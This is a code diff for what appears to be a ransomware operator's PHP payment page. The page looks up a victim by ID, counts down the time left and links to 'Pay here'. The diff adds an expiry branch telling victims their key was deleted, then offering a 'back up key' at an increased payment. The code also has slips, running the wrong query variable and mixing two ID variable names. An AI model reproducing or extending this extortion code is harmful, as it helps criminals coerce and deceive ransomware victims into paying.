@@ -27,17 +27,27 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
    if ($result->num_rows > 0) {
       while ($row = $result->fetch_assoc()) {
             if ($row['time_left'] < "00:00:01") {
-               echo "<center><font color='red'>";
-               echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
-               echo "</font></center>";
+               echo "$('#form_div').hide();" . "\n";
+               echo "$('#what_happened').hide();" . "\n";
+
+               $sql1 = "UPDATE target_list SET time_expired=\"TRUE\" where unique_id = \"$targetID\"";
+               $result1 = $conn->query($sql);
+
+               if ($result->num_rows > 0) {
+                  echo "<center>";
+                  echo "<font color=\"red\">";
+                  echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
+                  echo "<br /><br /><br />";
+                  echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
+                  echo "</font>";
+                  echo "<a href='/payment.php'>Pay here</a><br /><br />";
+                  echo "</center>";
+               }
             } else {
                echo "<center><font color='red'>";
                echo "<h1>Time Remaining for $uniqueID: " . $row['time_left'] . "</h1><br /><br />";
                echo "<a href='/payment.php'>Pay here</a><br /><br />";
                echo "</font></center>";
-               $page = $_SERVER['PHP_SELF'];
-               $sec = "1";
-               header("Refresh: $sec; url=$page");
             }
       }
    } else {
